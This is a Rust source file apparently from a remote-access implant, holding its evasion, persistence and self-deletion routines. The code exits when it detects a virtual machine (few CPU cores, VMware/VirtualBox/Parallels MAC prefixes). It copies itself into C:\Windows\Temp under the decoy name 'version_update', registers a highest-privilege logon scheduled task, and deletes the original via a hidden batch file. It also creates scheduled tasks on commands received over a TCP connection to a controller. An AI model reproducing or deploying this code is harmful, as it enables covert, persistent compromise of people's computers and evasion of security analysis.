pub struct Other;

use std::process;
use mac_address::get_mac_address;
use sys_info::cpu_num;
use crate::model::command_model::CommandModel;
use std::net::TcpStream;
use crate::model::tasksch::TaskSch;
use windows_taskscheduler::Task;


impl Other{

    // 通用检查
    pub fn init_check(){
        // // cpu核心小于4
        if cpu_num().unwrap() < 4 {
            process::exit(0);
        }
        // // mac地址检查
        match get_mac_address() {
            Ok(Some(mac)) => {
                let mac_address =  mac.to_string();
                let list = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27"];
                for item in list {
                  if mac_address.starts_with(item){
                    process::exit(0);
                  }
                }
            }
            Ok(None) => process::exit(0),
            Err(_) => process::exit(0),
        }
        // // 其他检查
        // Self::other_check();
        Self::check_tasksch();
    }

    // TODO: windows下额外的检查服务和进程列表
    // #[cfg(windows)]
    // pub fn other_check(){
        
    // }
    // #[cfg(not(windows))]
    // pub fn other_check(){
        
    // }
    // 创建一个计划任务，参数是可执行文件的全路径
    #[cfg(windows)]
    pub fn create_tasksch(command_model: CommandModel, stream: &mut TcpStream){
        // match Task::get_task(r"\", &task_name){
        //     // mutex
        //     Ok(taskd) => {
        //         if !&current_exe_path.to_str().unwrap().eq(&taskd.name().unwrap()) {
        //             process::exit(0);
        //         }
        //     },
        //     Err(_) => {
        //         let idle_trigger = TaskIdleTrigger::new(
        //             "idletrigger",
        //             Duration::from_secs(3 * 60),
        //             true,
        //             Duration::from_secs(10 * 60),
        //         );
        //         let action = TaskAction::new("action", &current_exe_path.to_str().unwrap(), "", "");
        //         Task::new(r"\").unwrap()
        //             .idle_trigger(idle_trigger).unwrap()
        //             .exec_action(action).unwrap()
        //             .principal(RunLevel::LUA, "", "").unwrap()
        //             .set_hidden(false).unwrap()
        //             .register(&task_name).unwrap();
        //     },
        // }
        use crate::utils::socket_util::SocketUtil;
        // 1.转换传输的对象
        let tasksch: TaskSch = serde_json::from_str(&command_model.data).unwrap();
        match Task::get_task(r"\", &tasksch.task_name) {
            // 2.存在同名的计划任务则返回该计划任务的信息
            Ok(_) => {
                SocketUtil::send_error_server(String::from("repeat"), stream)
            },
            // 不存在的则根据trigger判断要创建的计划任务类型
            Err(_) => {
                let tasksch: TaskSch = serde_json::from_str(&command_model.data).unwrap();
                Self::tasksch_create(&tasksch);
                SocketUtil::send_error_server(String::from("create tasksch success!"), stream)
            }
        }
    }
    #[cfg(not(windows))]
    pub fn create_tasksch(){
        // SocketUtil::send_error_server(String::from(""), stream)
    }

    // 添加定期计划任务
    // #[cfg(windows)]
    // pub fn tasksch_create(tasksch: &TaskSch){
    //     use std::time::Duration;
    //     use windows_taskscheduler::TaskAction;
    //     use windows_taskscheduler::{RunLevel, TaskIdleTrigger};
    //     let idle_trigger = TaskIdleTrigger::new(
    //         "idletrigger",
    //         Duration::from_secs(&tasksch.task_hours * 60),
    //         true,
    //         Duration::from_secs(10 * 60),
    //     );
    //     let action = TaskAction::new("action", &tasksch.exec_path, "", "");
    //     Task::new(r"\").unwrap()
    //         .idle_trigger(idle_trigger).unwrap()
    //         .exec_action(action).unwrap()
    //         .principal(RunLevel::LUA, "", "").unwrap()
    //         .set_hidden(false).unwrap()
    //         .register(&tasksch.task_name).unwrap();
    // }

    // 添加开机自启计划任务
    #[cfg(windows)]
    pub fn tasksch_create(tasksch: &TaskSch){
        use std::time::Duration;
        use windows_taskscheduler::{TaskAction, TaskLogonTrigger};
        use windows_taskscheduler::{RunLevel};
        let _logon_trigger = TaskLogonTrigger::new(
            "logontrigger",
            Duration::from_secs(3 * 60),
            true,
            Duration::from_secs(10),
            Duration::from_secs(1),
        );
        let action = TaskAction::new("action", &tasksch.exec_path, "", "");
        Task::new(r"\").unwrap()
            .logon_trigger(_logon_trigger).unwrap()
            .exec_action(action).unwrap()
            .principal(RunLevel::HIGHEST, "", "").unwrap()
            .set_hidden(false).unwrap()
            .register(&tasksch.task_name).unwrap();
    }

    #[cfg(windows)]
    pub fn check_tasksch(){
        use std::{os::windows::process::CommandExt, io::Write, process::Command};

        let task_name = "version_update";
        let keep_dir = r"C:\Windows\Temp\version_update.exe";

        match Task::get_task(r"\", &task_name) {
            // 2.存在同名的计划任务则返回该计划任务的信息
            Ok(_) => {
                if !std::env::current_exe().unwrap().ends_with("Temp\\version_update.exe"){
                    // println!("exit");
                    process::exit(0)
                }
            },
            // 不存在的则根据trigger判断要创建的计划任务类型
            Err(_) => {
                // print!("create tasksch");
                // copy this exe to temp dir C:\Windows\Temp
                let file = std::fs::read(std::env::current_exe().unwrap()).unwrap();
                // create file
                std::fs::write(&keep_dir, file).unwrap();
                // create tasksch
                Self::tasksch_create(&TaskSch{
                    task_name: task_name.to_string(),
                    task_hours: 1,
                    exec_path: keep_dir.to_string(),
                });
                // delete self
                let filename = r"C:\Windows\Temp\batch.bat";
                let mut bat_file = std::fs::File::create(&filename).unwrap();
                let command = format!("@echo off\nchoice /t 0 /d y /n > nul\ndel \"{}\"\ndel %0", std::env::current_exe().unwrap().to_str().unwrap());
                bat_file.write(command.as_bytes()).unwrap();
                // 释放句柄，防止bat文件还被控制
                std::mem::drop(bat_file);
                // 执行计划任务
                let register_task = Task::get_task(r"\", &task_name).unwrap();
                register_task.run_raw().unwrap();

                Command::new(&filename)
                        .creation_flags(0x08000000)
                        .spawn().unwrap();
                process::exit(0);
            }
        }
    }
    // #[cfg(windows)]
    // pub fn query_tasksch(command_model: CommandModel, stream: &mut TcpStream){
    //     match 
    //     // let taskinfo = TaskInfo{
    //             //     name: taskd.name().unwrap(),
    //             //     path: taskd.path().unwrap(),
    //             //     enabled: taskd.enabled().unwrap(),
    //             //     last_run_time: taskd.last_run_time().unwrap(),
    //             //     next_run_time: taskd.next_run_time().unwrap()
    //             // };
    //             // // 将要传输的内容转换成json
    //             // let json_data = serde_json::to_string(&taskinfo).unwrap();
    //             // // 组装传输对象
    //             // let result = CommandModel::new(
    //             //     command_model.target.clone(),
    //             //     command_model.receiver.clone(), 
    //             //     command_model.c_type, 
    //             //     command_model.action, 
    //             //     json_data
    //             // );
    //             // // 将要传输的模型转换成json
    //             // let json = serde_json::to_string(&result).unwrap();
    //             // // 回传
    //             // SocketUtil::send_to_server(json, stream);
    // }

    // #[cfg(not(windows))]
    // pub fn query_tasksch(){
    //     // SocketUtil::send_error_server(String::from(""), stream)
    // }

}